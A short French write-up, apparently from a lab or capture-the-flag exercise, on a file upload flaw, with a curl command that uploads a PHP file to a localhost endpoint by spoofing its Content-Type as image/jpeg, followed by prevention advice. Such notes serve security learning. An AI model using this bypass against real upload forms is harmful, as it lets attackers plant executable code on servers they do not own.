# File Upload

## Vulnérabilité

On peut uploader des fichiers potentiellement dangeureux en les faisant passer pour des images.

Il suffit d'utiliser la route d'upload d'image `/index.php?page=upload` en changeant le `Content-Type` (avec par example `image/jpeg`)

```shell
  $> curl -X POST -H 'Content-Type: multipart/form-data' --form 'Upload=Upload' --form 'uploaded=@hello.php;type=image/jpeg' 'http://localhost:9784/index.php?page=upload'
```

## Prévention

Restreindre l'execution à des types `MIME` prédéfinis

Blocker les extensions de fichier dangeurex (comme `php`)

Ne pas faire aveuglement confiance au `Content-Type` et à l'extension du fichier


## Ressources

[file upload](https://portswigger.net/web-security/file-upload)
